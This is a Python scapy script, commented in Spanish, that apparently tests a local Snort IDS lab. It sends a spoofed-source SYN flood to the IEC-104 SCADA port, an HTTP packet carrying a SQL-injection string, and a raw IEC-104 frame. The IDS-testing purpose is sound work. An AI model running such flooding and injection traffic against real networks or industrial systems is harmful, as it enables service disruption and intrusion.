import sys
import time
import random
from scapy.all import *

# ================= CONFIGURACIÓN =================
# TIP: Ejecuta 'docker inspect -f "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}" sis-snort'
# para obtener la IP real de tu contenedor Snort.
TARGET_IP = "172.18.0.3"  # <--- ¡CAMBIA ESTO POR LA IP DE TU CONTENEDOR SNORT!
TARGET_PORT_SCADA = 2404  # Puerto IEC-104
TARGET_PORT_WEB = 80

def get_docker_ip(container_name="sis-snort"):
    """Intenta obtener la IP automáticamente (solo funciona si tienes docker instalado localmente)"""
    import subprocess
    try:
        res = subprocess.check_output(f"docker inspect -f '{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}' {container_name}", shell=True)
        return res.decode().strip()
    except:
        return None

def attack_dos_syn_flood():
    print(f"\n🔥 Iniciando ataque DoS (SYN Flood) contra {TARGET_IP}:{TARGET_PORT_SCADA}...")
    print("   -> Enviando paquetes rápido para saturar umbral de Snort...")
    
    # Enviamos 50 paquetes para superar el threshold de 20
    for i in range(50):
        # IP origen aleatoria (Spoofing) para que parezca un ataque distribuido
        src_ip = f"10.0.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        
        # Construcción del paquete real
        ip = IP(src=src_ip, dst=TARGET_IP)
        tcp = TCP(sport=src_port, dport=TARGET_PORT_SCADA, flags="S") # Flag S = SYN
        pkt = ip/tcp
        
        send(pkt, verbose=0)
        if i % 10 == 0: print(f"   🚀 Enviados {i} paquetes...")
        time.sleep(0.01) # Muy rápido
        
    print("✅ Ataque DoS finalizado.")

def attack_exploit_payload():
    print(f"\n☠️ Lanzando Payload de Exploit contra {TARGET_IP}...")
    
    # Paquete con contenido malicioso
    ip = IP(dst=TARGET_IP)
    tcp = TCP(dport=TARGET_PORT_WEB, flags="PA") # PSH+ACK
    # El contenido "exploit" activará la regla SID 1000002
    payload = "GET /admin/login.php?user=admin&pass=' OR 1=1; -- exploit_code_exec"
    
    pkt = ip/tcp/payload
    send(pkt, verbose=0)
    print("✅ Payload enviado.")

def attack_iec104_malformed():
    print(f"\n🏭 Enviando comando IEC-104 sospechoso...")
    
    ip = IP(dst=TARGET_IP)
    tcp = TCP(dport=TARGET_PORT_SCADA, flags="PA")
    # Byte 0x68 es el inicio de frame IEC-104 (APDU)
    payload = b'\x68\x04\x07\x00\x00\x00' 
    
    pkt = ip/tcp/payload
    send(pkt, verbose=0)
    print("✅ Paquete SCADA enviado.")

if __name__ == "__main__":
    # 1. Intentar autodetectar IP
    auto_ip = get_docker_ip()
    target = auto_ip if auto_ip else TARGET_IP
    
    print(f"🎯 OBJETIVO DETECTADO: {target}")
    
    # Actualizar global
    TARGET_IP = target

    confirmation = input("⚠️  ADVERTENCIA: Vas a enviar tráfico ofensivo real. ¿Continuar? (s/n): ")
    if confirmation.lower() != 's': sys.exit()

    # 2. Ejecutar secuencia de ataque
    attack_iec104_malformed()
    time.sleep(2)
    attack_exploit_payload()
    time.sleep(2)
    attack_dos_syn_flood()

    print("\n🏁 Simulación terminada. Revisa los logs de Snort y el Dashboard.")